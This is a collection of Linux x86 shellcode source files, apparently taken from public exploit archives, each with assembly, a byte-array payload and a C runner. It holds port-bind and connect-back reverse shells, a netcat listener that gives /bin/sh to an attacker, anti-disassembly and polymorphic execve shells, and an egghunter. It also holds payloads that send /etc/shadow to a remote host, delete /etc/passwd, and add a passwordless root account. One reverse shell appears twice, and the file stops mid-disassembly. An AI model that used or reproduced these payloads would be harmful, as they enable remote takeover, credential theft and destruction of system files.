 *    filename: x86-linux-portbind.c                                         *
 * discription: x86-linux portbind shellcode.				     *
 *		Pretty big but excellent for educational purposes.	     *
 *		Use SET_PORT() before using the shellcode. Example:	     *
 *									     *
 *			SET_PORT(sc, 31337);			             *
 *									     *
 *___________________________________________________________________________*
 *---------------------------------------------------------------------------*/

/*---------------------------------------------------------------------------*
 *				ASM Code	                             *
 *---------------------------------------------------------------------------*

# s = socket(2, 1, 0)
push   $0x66			#
pop    %eax			# 0x66 = socketcall
push   $0x1			#
pop    %ebx			# socket() = 1
xor    %ecx,%ecx		#
push   %ecx			# 0
push   $0x1			# SOCK_STREAM = 1
push   $0x2			# AF_INET = 2
mov    %esp,%ecx		# Arguments
int    $0x80			# EXECUTE - Now %eax have the s fileDescriptor

# bind(s [2, 64713, 0], 0x10)
xor    %edx,%edx
push   %edx			# INADDR_ANY = 0
pushw  $0xc9fc			# PORT = 64713
pushw  $0x2			# AF_INET = 2
mov    %esp,%ecx		# %ecx holds server struct
push   $0x10			# sizeof(server) = 10
push   %ecx			# server struct
push   %eax			# s fileDescriptor
mov    %esp,%ecx
mov    %eax,%esi		# now %esi holds s fileDescriptor
push   $0x2			#
pop    %ebx			# bind() = 2
push   $0x66			#
pop    %eax			# 0x66 = socketcall
int    $0x80			# On success: %eax = 0

# listen(s, 0)
push   $0x66			#
pop    %eax			# 0x66 = socketcall
push   $0x4			#
pop    %ebx			# listen() = 4
int    $0x80			# On success: %eax = 0

# c = accept(s, 0, 0)
xor    %ecx,%ecx
push   %ecx
push   %ecx
push   %esi			# %esi = s
mov    %esp,%ecx		# Arguments
push   $0x5			#
pop    %ebx			# accept() = 5
push   $0x66			#
pop    %eax			# 0x66 = socketcall
int    $0x80			# EXECUTE - Now %eax have c fileDescriptor

# dup2(c, 2) , dup2(c, 1) , dup2(c, 0)
xchg   %eax,%ebx        	# Put c fileDescriptor on %ebx [for dup2()]
push   $0x2
pop    %ecx
dup_loop:
mov    $0x3f,%al		# dup2() = 0x3f
int    $0x80
dec    %ecx
jns    dup_loop

# execve("/bin//sh", ["/bin//sh",NULL])
mov    $0xb,%al			# execve = 11d
push   %edx
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %edx
push   %ebx
mov    %esp, %ecx
int    $0x80

*----------------------------------------------------------------------------*/

char sc[] =	
"\x6a\x66"                   	//push   $0x66
"\x58"                      	//pop    %eax
"\x6a\x01"                   	//push   $0x1
"\x5b"                      	//pop    %ebx
"\x31\xc9"                   	//xor    %ecx,%ecx
"\x51"                      	//push   %ecx
"\x6a\x01"                   	//push   $0x1
"\x6a\x02"                   	//push   $0x2
"\x89\xe1"                   	//mov    %esp,%ecx
"\xcd\x80"                   	//int    $0x80
"\x31\xd2"                   	//xor    %edx,%edx
"\x52"                      	//push   %edx
"\x66\x68\xfc\xc9"             	//pushw  $0xc9fc	//PORT
"\x66\x6a\x02"                	//pushw  $0x2
"\x89\xe1"                   	//mov    %esp,%ecx
"\x6a\x10"                   	//push   $0x10
"\x51"                      	//push   %ecx
"\x50"                      	//push   %eax
"\x89\xe1"                   	//mov    %esp,%ecx
"\x89\xc6"                   	//mov    %eax,%esi
"\x6a\x02"                   	//push   $0x2
"\x5b"                      	//pop    %ebx
"\x6a\x66"                   	//push   $0x66
"\x58"                      	//pop    %eax
"\xcd\x80"                   	//int    $0x80
"\x6a\x66"                   	//push   $0x66
"\x58"                      	//pop    %eax
"\x6a\x04"                   	//push   $0x4
"\x5b"                      	//pop    %ebx
"\xcd\x80"                   	//int    $0x80
"\x31\xc9"                   	//xor    %ecx,%ecx
"\x51"                      	//push   %ecx
"\x51"                      	//push   %ecx
"\x56"                      	//push   %esi
"\x89\xe1"                   	//mov    %esp,%ecx
"\x6a\x05"                   	//push   $0x5
"\x5b"                      	//pop    %ebx
"\x6a\x66"                   	//push   $0x66
"\x58"                      	//pop    %eax
"\xcd\x80"                   	//int    $0x80
"\x93"                      	//xchg   %eax,%ebx
"\x6a\x02"                   	//push   $0x2
"\x59"                      	//pop    %ecx
"\xb0\x3f"                   	//mov    $0x3f,%al
"\xcd\x80"                   	//int    $0x80
"\x49"                      	//dec    %ecx
"\x79\xf9"                   	//jns    48 <dup_loop>
"\xb0\x0b"                   	//mov    $0xb,%al
"\x52"                      	//push   %edx
"\x68\x2f\x2f\x73\x68"          //push   $0x68732f2f
"\x68\x2f\x62\x69\x6e"          //push   $0x6e69622f
"\x89\xe3"                   	//mov    %esp,%ebx
"\x52"                      	//push   %edx
"\x53"                      	//push   %ebx
"\x89\xe1"                   	//mov    %esp,%ecx
"\xcd\x80";                   	//int    $0x80

void SET_PORT(char *buf, int port) {
	*(unsigned short *)(((buf)+22)) = (port);
	char tmp = buf[22];
	buf[22] = buf[23];
	buf[23] = tmp;
}

main(){
	printf("size: %d bytes\n", strlen(sc));
	
	SET_PORT(sc, 33333);
	__asm__("call sc");
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*---------------------------------------------------------------------------*
 *                 82 byte Connectback shellcode                             *
 *              by Benjamin Orozco - benoror@gmail.com                       *
 *---------------------------------------------------------------------------*
 *    filename: x86-linux-connectback.c                                      *
 * discription: x86-linux connect back shellcode. Use SET_PORT() and	     *
 *		SET_IP() before using the shellcode. Example:                *
 *									     *
 *			SET_IP(sc, "192.168.13.22");			     *
 *			SET_PORT(sc, 31337);				     *
 *									     *
 *___________________________________________________________________________*
 *---------------------------------------------------------------------------*/

/*---------------------------------------------------------------------------*
 *				ASM Code				     *
 *---------------------------------------------------------------------------*

# s = socket(2, 1, 0)
push   $0x66			#
pop    %eax			# 0x66 = socketcall
push   $0x1			#
pop    %ebx			# socket() = 1
xor    %ecx,%ecx		#
push   %ecx			# 0
push   $0x1			# SOCK_STREAM = 1
push   $0x2			# AF_INET = 2
mov    %esp,%ecx		# Arguments
int    $0x80			# EXECUTE - Now %eax have the s fileDescriptor

# connect(s, [2, 64713, 127.127.127], 0x10)
push   $0x7f7f7f7f		# 127.127.127 = 0x7f7f7f7f
pushw  $0xc9fc			# PORT = 64713
pushw  $0x2			# AF_INET = 2
mov    %esp,%ecx		# %ecx holds server struct
push   $0x10			# sizeof(server) = 10
push   %ecx			# server struct
push   %eax			# s fileDescriptor
mov    %esp,%ecx
mov    %eax,%esi		# now %esi holds s fileDescriptor [for connect()]
push   $0x3			#
pop    %ebx			# connect() = 3
push   $0x66			#
pop    %eax			# 0x66 = socketcall
int    $0x80			# On success %eax = 0

# dup2(s, 2) , dup2(s, 1) , dup2(s, 0)
xchg   %esi,%ebx        	# Put s fileDescriptor on %ebx [for dup2()]
push   $0x2
pop    %ecx
dup_loop:
mov    $0x3f,%al		# dup2() = 0x3f
int    $0x80
dec    %ecx
jns    dup_loop

# execve("/bin//sh", ["/bin//sh",NULL])
mov    $0xb,%al			# execve = 11d
xor    %edx,%edx
push   %edx
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %edx
push   %ebx
mov    %esp, %ecx
int    $0x80

*----------------------------------------------------------------------------*/

char sc[] =
"\x6a\x66"                		//push   $0x66
"\x58"                   		//pop    %eax
"\x6a\x01"                		//push   $0x1
"\x5b"                   		//pop    %ebx
"\x31\xc9"                		//xor    %ecx,%ecx
"\x51"                   		//push   %ecx
"\x6a\x01"                		//push   $0x1
"\x6a\x02"                		//push   $0x2
"\x89\xe1"                		//mov    %esp,%ecx
"\xcd\x80"                		//int    $0x80
"\x68\x7f\x7f\x7f\x7f"       		//push   $0x7f7f7f7f	//IP
"\x66\x68\xfc\xc9"          		//pushw  $0xc9fc	//PORT
"\x66\x6a\x02"             		//pushw  $0x2
"\x89\xe1"                		//mov    %esp,%ecx
"\x6a\x10"                		//push   $0x10
"\x51"                   		//push   %ecx
"\x50"                   		//push   %eax
"\x89\xe1"                		//mov    %esp,%ecx
"\x89\xc6"                		//mov    %eax,%esi
"\x6a\x03"                		//push   $0x3
"\x5b"                   		//pop    %ebx
"\x6a\x66"                		//push   $0x66
"\x58"                   		//pop    %eax
"\xcd\x80"                		//int    $0x80
"\x87\xf3"                		//xchg   %esi,%ebx
"\x6a\x02"                		//push   $0x2
"\x59"                   		//pop    %ecx
"\xb0\x3f"                		//mov    $0x3f,%al
"\xcd\x80"               		//int    $0x80
"\x49"                   		//dec    %ecx
"\x79\xf9"                		//jns    34 <dup_loop>
"\xb0\x0b"                		//mov    $0xb,%al
"\x31\xd2"                		//xor    %edx,%edx
"\x52"                   		//push   %edx
"\x68\x2f\x2f\x73\x68"       		//push   $0x68732f2f
"\x68\x2f\x62\x69\x6e"       		//push   $0x6e69622f
"\x89\xe3"                		//mov    %esp,%ebx
"\x52"                   		//push   %edx
"\x53"                   		//push   %ebx
"\x89\xe1"                		//mov    %esp,%ecx
"\xcd\x80";               		//int    $0x80

void SET_PORT(char *buf, int port) {
	*(unsigned short *)(((buf)+24)) = (port);
	char tmp = buf[24];
	buf[24] = buf[25];
	buf[25] = tmp;
}

void SET_IP(char *buf, char *ip) {
	unsigned long backip = inet_addr(ip);
	*(unsigned long *)(((buf)+18)) = (backip);
}

main(){
	printf("size: %d bytes\n", strlen(sc));

	SET_PORT(sc, 33333);
	SET_IP(sc, "127.0.0.1");
	__asm__("call sc");
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*---------------------------------------------------------------------------*
 *                 82 byte Connectback shellcode                             *
 *              by Benjamin Orozco - benoror@gmail.com                       *
 *---------------------------------------------------------------------------*
 *    filename: x86-linux-connectback.c                                      *
 * discription: x86-linux connect back shellcode. Use SET_PORT() and	     *
 *		SET_IP() before using the shellcode. Example:                *
 *									     *
 *			SET_IP(sc, "192.168.13.22");			     *
 *			SET_PORT(sc, 31337);				     *
 *									     *
 *___________________________________________________________________________*
 *---------------------------------------------------------------------------*/

/*---------------------------------------------------------------------------*
 *				ASM Code				     *
 *---------------------------------------------------------------------------*

# s = socket(2, 1, 0)
push   $0x66			#
pop    %eax			# 0x66 = socketcall
push   $0x1			#
pop    %ebx			# socket() = 1
xor    %ecx,%ecx		#
push   %ecx			# 0
push   $0x1			# SOCK_STREAM = 1
push   $0x2			# AF_INET = 2
mov    %esp,%ecx		# Arguments
int    $0x80			# EXECUTE - Now %eax have the s fileDescriptor

# connect(s, [2, 64713, 127.127.127], 0x10)
push   $0x7f7f7f7f		# 127.127.127 = 0x7f7f7f7f
pushw  $0xc9fc			# PORT = 64713
pushw  $0x2			# AF_INET = 2
mov    %esp,%ecx		# %ecx holds server struct
push   $0x10			# sizeof(server) = 10
push   %ecx			# server struct
push   %eax			# s fileDescriptor
mov    %esp,%ecx
mov    %eax,%esi		# now %esi holds s fileDescriptor [for connect()]
push   $0x3			#
pop    %ebx			# connect() = 3
push   $0x66			#
pop    %eax			# 0x66 = socketcall
int    $0x80			# On success %eax = 0

# dup2(s, 2) , dup2(s, 1) , dup2(s, 0)
xchg   %esi,%ebx        	# Put s fileDescriptor on %ebx [for dup2()]
push   $0x2
pop    %ecx
dup_loop:
mov    $0x3f,%al		# dup2() = 0x3f
int    $0x80
dec    %ecx
jns    dup_loop

# execve("/bin//sh", ["/bin//sh",NULL])
mov    $0xb,%al			# execve = 11d
xor    %edx,%edx
push   %edx
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %edx
push   %ebx
mov    %esp, %ecx
int    $0x80

*----------------------------------------------------------------------------*/

char sc[] =
"\x6a\x66"                		//push   $0x66
"\x58"                   		//pop    %eax
"\x6a\x01"                		//push   $0x1
"\x5b"                   		//pop    %ebx
"\x31\xc9"                		//xor    %ecx,%ecx
"\x51"                   		//push   %ecx
"\x6a\x01"                		//push   $0x1
"\x6a\x02"                		//push   $0x2
"\x89\xe1"                		//mov    %esp,%ecx
"\xcd\x80"                		//int    $0x80
"\x68\x7f\x7f\x7f\x7f"       		//push   $0x7f7f7f7f	//IP
"\x66\x68\xfc\xc9"          		//pushw  $0xc9fc	//PORT
"\x66\x6a\x02"             		//pushw  $0x2
"\x89\xe1"                		//mov    %esp,%ecx
"\x6a\x10"                		//push   $0x10
"\x51"                   		//push   %ecx
"\x50"                   		//push   %eax
"\x89\xe1"                		//mov    %esp,%ecx
"\x89\xc6"                		//mov    %eax,%esi
"\x6a\x03"                		//push   $0x3
"\x5b"                   		//pop    %ebx
"\x6a\x66"                		//push   $0x66
"\x58"                   		//pop    %eax
"\xcd\x80"                		//int    $0x80
"\x87\xf3"                		//xchg   %esi,%ebx
"\x6a\x02"                		//push   $0x2
"\x59"                   		//pop    %ecx
"\xb0\x3f"                		//mov    $0x3f,%al
"\xcd\x80"               		//int    $0x80
"\x49"                   		//dec    %ecx
"\x79\xf9"                		//jns    34 <dup_loop>
"\xb0\x0b"                		//mov    $0xb,%al
"\x31\xd2"                		//xor    %edx,%edx
"\x52"                   		//push   %edx
"\x68\x2f\x2f\x73\x68"       		//push   $0x68732f2f
"\x68\x2f\x62\x69\x6e"       		//push   $0x6e69622f
"\x89\xe3"                		//mov    %esp,%ebx
"\x52"                   		//push   %edx
"\x53"                   		//push   %ebx
"\x89\xe1"                		//mov    %esp,%ecx
"\xcd\x80";               		//int    $0x80

void SET_PORT(char *buf, int port) {
	*(unsigned short *)(((buf)+24)) = (port);
	char tmp = buf[24];
	buf[24] = buf[25];
	buf[25] = tmp;
}

void SET_IP(char *buf, char *ip) {
	unsigned long backip = inet_addr(ip);
	*(unsigned long *)(((buf)+18)) = (backip);
}

main(){
	printf("size: %d bytes\n", strlen(sc));

	SET_PORT(sc, 33333);
	SET_IP(sc, "127.0.0.1");
	__asm__("call sc");
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*  execve() shellcode with 'fuck up disasm' ability, 32 bytes long
    by BaCkSpAcE [sinisa86(at)gmail(dot)com]
    BitByterz Labs 2006
    http://www.bitbyterz.org

;
; shellcode.asm
;
  fupdisasm:
    db 0x68		; opcode for PUSH DW instruction
    db 0xcd		; crypt+1, opcode for INT instruction
    db 0x80		; interrupt number (80 in this case)
    db 0x68		; crypt+3
    db 0x68
    jmp fupdisasm+3
    db 0x68		; MAGIC_BYTE: this byte makes disasm go crazy

; our shellcode which we want to hide
    push byte 11
    pop eax
    xor edx, edx
    push edx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push edx
    push ebx
    mov ecx, esp
    jmp fupdisasm+1	; jumps on address where is hidden int 0x80


    backspace@bitbyterz# nasm shellcode.asm
    backspace@bitbyterz# ndisasm -u shellcode
    00000000  68CD806868        push dword 0x686880cd
    00000005  EBFC              jmp short 0x3
    00000007  686A0B5831        push dword 0x31580b6a
    0000000C  D25268            rcl byte [edx+0x68],cl
    0000000F  2F                das
    00000010  2F                das
    00000011  7368              jnc 0x7b
    00000013  682F62696E        push dword 0x6e69622f
    00000018  89E3              mov ebx,esp
    0000001A  52                push edx
    0000001B  53                push ebx
    0000001C  89E1              mov ecx,esp
    0000001E  EBE1              jmp short 0x1

    Find difference between original and dissasembled shellcode ;)
*/

#include <stdio.h>
#include <string.h>

char shellcode[] =      "\x68\xcd\x80\x68\x68\xeb\xfc\x68"
			"\x6a\x0b\x58\x31\xd2\x52\x68\x2f"
			"\x2f\x73\x68\x68\x2f\x62\x69\x6e"
			"\x89\xe3\x52\x53\x89\xe1\xeb\xe1";

main() {
  void  (*fp) (void);
  fp = (void *) shellcode;
  printf ("%d bytes\n", strlen(shellcode));
  fp();
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <string.h>

/* 
 Aodrulez's /bin/sh Null-Free Polymorphic Shellcode.
 Shellcode size : 46 bytes.
 [Special Tnx to 'Chema Garcia (aka sch3m4)']
 Tested on : Ubuntu 8.04,Hardy Heron.
 Email : f3arm3d3ar[at]gmail.com
 Author: Aodrulez. (Atul Alex Cherian)
 Blog  : Aodrulez@blogspot.com
*/


char code[] = "\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2"
	      "\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69"
	      "\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81";

int main(int argc, char **argv)
{
	fprintf(stdout,"Aodrulez's Linux Polym0rphic Shellc0de.\nShellcode Size: %d bytes.\n",strlen(code));
        (*(void(*)()) code)();
return 0;

}


/*
Greetz Fly Out to:-
1] Amforked()    : My Mentor.
2] TheBlueGenius : My Boss ;-)
3] www.orchidseven.com
4] www.isac.org.in
5] www.Malcon.org -> World's first Malware Conference!
*/




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

linux x86 nc -lvve/bin/sh -p13377 shellcode
This shellcode will listen on port 13377 using netcat and give /bin/sh to connecting attacker
Author: Anonymous
Site: http://chaossecurity.wordpress.com/
Here is code written in NASM
/////////////////////////////
section .text
    global _start
_start:
xor eax,eax
xor edx,edx
push 0x37373333
push 0x3170762d
mov edx, esp
push eax
push 0x68732f6e
push 0x69622f65
push 0x76766c2d
mov ecx,esp
push eax
push 0x636e2f2f
push 0x2f2f2f2f
push 0x6e69622f
mov ebx, esp
push eax
push edx
push ecx
push ebx
xor edx,edx
mov  ecx,esp
mov al,11
int 0x80
//////////////////////////////////
And here is objdump from which you can see the shellcode
//////////////////////////////////
teo@teo-desktop ~ $ objdump -d a.out
a.out:     file format elf32-i386
Disassembly of section .text:
08048060 <.text>:
 8048060:   31 c0                   xor    %eax,%eax
 8048062:   31 d2                   xor    %edx,%edx
 8048064:   68 33 33 37 37          push   $0x37373333
 8048069:   68 2d 76 70 31          push   $0x3170762d
 804806e:   89 e2                   mov    %esp,%edx
 8048070:   50                      push   %eax
 8048071:   68 6e 2f 73 68          push   $0x68732f6e
 8048076:   68 65 2f 62 69          push   $0x69622f65
 804807b:   68 2d 6c 76 76          push   $0x76766c2d
 8048080:   89 e1                   mov    %esp,%ecx
 8048082:   50                      push   %eax
 8048083:   68 2f 2f 6e 63          push   $0x636e2f2f
 8048088:   68 2f 2f 2f 2f          push   $0x2f2f2f2f
 804808d:   68 2f 62 69 6e          push   $0x6e69622f
 8048092:   89 e3                   mov    %esp,%ebx
 8048094:   50                      push   %eax
 8048095:   52                      push   %edx
 8048096:   51                      push   %ecx
 8048097:   53                      push   %ebx
 8048098:   31 d2                   xor    %edx,%edx
 804809a:   89 e1                   mov    %esp,%ecx
 804809c:   b0 0b                   mov    $0xb,%al
 804809e:   cd 80                   int    $0x80



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Exploit Title: Linux/x86 egghunt shellcode 29 bytes NULL free
Date: 23-07-2011
Author: Ali Raheem
Tested on:
Linux Ali-PC.home 2.6.38.8-35.fc15.x86_64 #1 SMP Wed Jul 6 13:58:54 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux
Linux injustice 2.6.38-10-generic #46-Ubuntu SMP Tue Jun 28 15:05:41 UTC 2011 i686 i686 i386 GNU/Linux
http://codepad.org/2yMrNY5L Code pad lets you execute code live check here for a live demostration
Thanks: Stealth- for testing and codepad.com for being so useful.
section .data
    msg     db "We found the egg!",0ah,0dh
        msg_len equ $-msg
        egg     equ "egg "
        egg1    equ "mark"
section .text
    global  _start
_start:
        jmp     _return
_continue:
    pop     eax             ;This can point anywhere valid
_next:
        inc     eax     ;change to dec if you want to search backwards
_isEgg:
        cmp     dword [eax-8],egg
        jne     _next
        cmp     dword [eax-4],egg1
        jne     _next
        jmp     eax
_return:
        call    _continue
_egg:
        db  "egg mark"              ;QWORD egg marker
        sub     eax,8
        mov     ecx,eax
        mov     edx,8
        mov     eax,4
        mov     ebx,1
        int     80h
        mov     eax,1
        mov     ebx,0
        int     80h
*/
char hunter[] =
"\xeb\x16"
"\x58"
"\x40" /* \x40 = inc eax, \x48 = dec eax try both*/
"\x81\x78\xf8\x65\x67\x67\x20"
"\x75\xf6"
"\x81\x78\xfc\x6d\x61\x72\x6b"
"\x75\xed"
"\xff\xe0"
"\xe8\xe5\xff\xff\xff";
 
char egg[] =
"egg mark" /* The rest of this is the shellcode you want found*/
"\x83\xe8\x08" /*This shellcode prints eax-4 i.e. the egg mark*/
"\x89\xc1"
"\xba\x08\x00\x00\x00"
"\xb8\x04\x00\x00\x00"
"\xbb\x01\x00\x00\x00"
"\xcd\x80"
"\xb8\x01\x00\x00\x00"
"\xbb\x00\x00\x00\x00"
"\xcd\x80";
 
int main(){
     (*(void  (*)()) hunter)();
     return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#    XCHG Research Group
#    Linux/x86 execve read shellcode - 92 bytes
#    
#    
#    )--[ Writed by 0ut0fbound ]--(
#    
#    - http://outofbound.host.sk
#    - http://xchglabs.host.sk

.text

	.globl _start

_start:

# EAX = 0x04 -> syscall write()
	xorl %eax, %eax
	movb $0x4, %al
	xorl %ebx, %ebx
	inc %ebx
	pushl $0x20202020
	pushl $0x3a646e61
	pushl $0x6d6d6f43
	movl %esp, %ecx
	xorl %edx, %edx
	movb $0x9, %dl
	int $0x80 
	
# EAX = 0x03 -> syscall read()
	xorl %eax, %eax
	movb $0x3, %al
	xorl %ebx, %ebx
	xorl %edx, %edx
	movb $0x20, %dl
	subl %edx, %esp
	movl %esp, %ecx
	int $0x80 
	
# buffer[read(0, buffer, sizeof(buffer))] = 0;
	addl %eax, %ecx
	dec %ecx 
	movl %ebx, (%ecx)
	
	movl %esp, %ebx
	addl %eax, %ebx
	movl %eax, %ecx
	
	xorl %edx, %edx
	push %edx 
	
LOOP1: 
	movb (%ebx), %al
	cmp $0x20, %al
	jne CONT 
	xorb $0x20, (%ebx)
	inc %ebx 
	pushl %ebx 
	dec %ebx 
CONT: 
	dec %ebx 
loop LOOP1 
	
	push %ebx 
	
	movl %esp, %ecx
	xorl %eax, %eax
	movb $0xb, %al
	
	int $0x80 
	
# EAX = 0x01 -> syscall exit
	xorl %eax, %eax
	inc %al 
	xorl %ebx, %ebx
	int $0x80 




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

;                           (C)oDed by 0in
;                   Dark-Coders Group Productions
;        [Linux x86 connect back&send&exit /etc/shadow 155 byte shellcode]
;   >>>>>>>>>>>>>>>>>>>> www.dark-coders.pl <<<<<<<<<<<<<<<<<<<<<<
;               Contact: 0in[dot]email[at]gmail[dot]com
;           Greetings to:die_Angel,suN8Hclf,m4r1usz,cOndemned
; Compile:
;       nasm -f elf shellcode.asm
;       ld -o shellcode shellcode.o
; How it works!?
; (1st console) [root@13world]# ./shellcode
; (2nd console) 0in[~]%> nc -v -l -p 8192
; (2nd console)
;Connection from 127.0.0.1:48820
;root:[password here]:13896::::::
;bin:x:0::::::
;daemon:x:0::::::
;mail:x:0::::::
;ftp:x:0::::::
;nobody:x:0::::::
;dbus:!:13716:0:99999:7:::
;zer0in:[password here]:13716:0:99999:7:::
;avahi:!:13716:0:99999:7:::
;hal:!:13716:0:99999:7:::
;clamav:!:13735:0:99999:7:::
;fetchmail:!:13737:0:99999:7:::
;mysql:!:12072:0:99999:7:::
;postfix:!:13798:0:99999:7:::
;mpd:!:13828:0:99999:7:::
;nginx:!:13959:0:99999:7:::
;tomcat:!:14063:0:99999:7:::
;http:!:14075:0:99999:7:::
;snort:!:14075:0:99999:7:::

;The code (Assembler version):

Section .text
    global _start

_start:
          ;open(file,O_RDONLY):
        xor ebx,ebx
        push byte 0x77 ;/etc/shadow
        push word 0x6f64
        push 0x6168732f
        push 0x6374652f; ----------
        mov ebx,esp ; first arg - filename
        xor ax,ax
        inc ax
        inc ax
        inc ax
        inc ax
        inc ax ; ax = 5 (O_RDONLY)
        int 0x80
        mov ebx,eax
        ;read(file,buff,1222):
        xor ax,ax
        inc ax
        inc ax
        inc ax ; syscall id = 3
        mov dx,1222 ; size to read
        push esp
        mov ecx,[esp] ; memory
        int 0x80
        mov esi,eax ; file to ESI
        ;socket(PF_INET,SOCK_STREAM,IPPROTO_IP)
        xor ebx,ebx
        push ebx ;0 ; 3rd arg
        inc ebx
        push ebx ;1 ; 2nd arg
        inc ebx
        push ebx ;2 ; 1st arg
                    ;socketcall()
        mov ax,1666 ;--------------
        sub ax,1564 ;--------------
        xor bx,bx   ; socket() call id
        inc bx      ;- - - - - - - - -
        mov ecx,esp ; socket()
        int 0x80    ; do it!
        pop ebx; clear mem
        ;connect(eax,struct server,16)
                  ;16 - sizeof struct sockaddr
        mov edx, eax
        xor ebx,ebx
        xor ebx,ebx  ; ebx = 0 - IP=0.0.0.0 (set EBX to ur IP)
        push ebx
        mov bx,1666 ; definition of struct sockaddr
        sub bx,1634 ;we cant stay 0x00 here (8192 PORT)
        push bx
        mov al, 2 ;
        push ax
        mov ecx, esp
        mov al, 16
        push eax
        push ecx
        push edx
        mov al, 102
        mov bx,1666
        sub bx,1663 ;---------------------------------
        mov ecx, esp
        int 0x80 ; call connect
        mov ebx,eax ; socket to ebx
        ; Ok! so...
        ; Lets write file to server and go down!
        ;write(socket,file,1222)
        pop ebx
        mov ax,1666
        sub ax,1662
        push esi
        mov dx,16666
        sub dx,15444
        int 0x80
        ;exit(1) :
        xor eax,eax ;----------
        inc eax
        mov ebx,eax ;----------
        int 0x80    ; do it!
;C:
;   #include <stdio.h>
;   char shellcode[]="\x31\xdb"
;   "\x6a\x77"
;   "\x66\x68\x64\x6f"
;   "\x68\x2f\x73\x68\x61"
;   "\x68\x2f\x65\x74\x63"
;   "\x89\xe3"
;   "\x66\x31\xc0"
;   "\x66\x40"
;   "\x66\x40"
;   "\x66\x40"
;   "\x66\x40"
;   "\x66\x40"
;   "\xcd\x80"
;   "\x89\xc3"
;   "\x66\x31\xc0"
;   "\x66\x40"
;   "\x66\x40"
;   "\x66\x40"
;   "\x66\xba\xc6\x04"
;   "\x54"
;   "\x8b\x0c\x24"
;   "\xcd\x80"
;   "\x89\xc6"
;   "\x31\xdb"
;   "\x53"
;   "\x43"
;   "\x53"
;   "\x43"
;   "\x53"
;   "\x66\xb8\x82\x06"
;   "\x66\x2d\x1c\x06"
;   "\x66\x31\xdb"
;   "\x66\x43"
;   "\x89\xe1"
;   "\xcd\x80"
;   "\x5b"
;   "\x89\xc2"
;   "\x31\xdb"
;   "\x53"
;   "\x66\xbb\x82\x06"
;   "\x66\x81\xeb\x62\x06"
;   "\x66\x53"
;   "\xb0\x02"
;   "\x66\x50"
;   "\x89\xe1"
;   "\xb0\x10"
;   "\x50"
;   "\x51"
;   "\x52"
;   "\xb0\x66"
;   "\x66\xbb\x82\x06"
;   "\x66\x81\xeb\x7f\x06"
;   "\x89\xe1"
;   "\xcd\x80"
;   "\x89\xc3"
;   "\x5b"
;   "\x66\xb8\x82\x06"
;   "\x66\x2d\x7e\x06"
;   "\x56"
;   "\x66\xba\x1a\x41"
;   "\x66\x81\xea\x54\x3c"
;   "\xcd\x80"
;   "\x31\xc0"
;   "\x40"
;   "\x89\xc3"
;   "\xcd\x80";
;   int main(int argc, char **argv)
;    {
;	    int *ret;
;	    ret = (int *)&ret + 2;
;	    (*ret) = (int) shellcode;
;    }



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
    unlink_passwd.c
    Platform: linux/x86
    Size: 35 bytes
    Author: $andman <n4mdn4s[4T]gmail.com>
*/

#include <string.h>
#include <stdio.h>
char shell[] =  "\xeb\x11"                 //jmp    8048073
                "\x5e"                     //pop    %esi
                "\x31\xc0"                 //xor    %eax,%eax
                "\x31\xc9"                 //xor    %ecx,%ecx
                "\x31\xd2"                 //xor    %edx,%edx
                "\xb0\x0a"                 //mov    $0xa,%al
                "\x89\xf3"                 //mov    %esi,%ebx
                "\xcd\x80"                 //int    $0x80
                "\xb0\x01"                 //mov    $0x1,%al
                "\xcd\x80"                 //int    $0x80
                "\xe8\xea\xff\xff\xff"     //call    8048062
                "\x2f"                          
                "\x65"                         
                "\x74\x63"                   
                "\x2f"                          
                "\x70\x61"                   
                "\x73\x73"                   
                "\x77\x64";   
               
int main()
{
  printf("Shellcode Length: %d\n",strlen(shell));
  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shell;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
    append_passwd.c
    Payload: Adds the string: [toor::0:0:t00r:/root:/bin/bash] to /etc/passwd thereby adding a password-less root account with login name "toor".
    Platform: linux/x86
    Size: 107 bytes
    Author: $andman, n4mdn4s[4T]gmail.com
*/

/*
08049054 <_start>:
 8049054:    eb 38                   jmp    804908e <callfunc>

08049056 <func>:
 8049056:    5e                      pop    %esi
 8049057:    31 c0                   xor    %eax,%eax
 8049059:    88 46 0b                mov    %al,0xb(%esi)
 804905c:    88 46 2b                mov    %al,0x2b(%esi)
 804905f:    c6 46 2a 0a             movb   $0xa,0x2a(%esi)
 8049063:    8d 5e 0c                lea    0xc(%esi),%ebx
 8049066:    89 5e 2c                mov    %ebx,0x2c(%esi)
 8049069:    8d 1e                   lea    (%esi),%ebx
 804906b:    66 b9 42 04             mov    $0x442,%cx
 804906f:    66 ba a4 01             mov    $0x1a4,%dx
 8049073:    b0 05                   mov    $0x5,%al
 8049075:    cd 80                   int    $0x80
 8049077:    89 c3                   mov    %eax,%ebx
 8049079:    31 d2                   xor    %edx,%edx
 804907b:    8b 4e 2c                mov    0x2c(%esi),%ecx
 804907e:    b2 1f                   mov    $0x1f,%dl
 8049080:    b0 04                   mov    $0x4,%al
 8049082:    cd 80                   int    $0x80
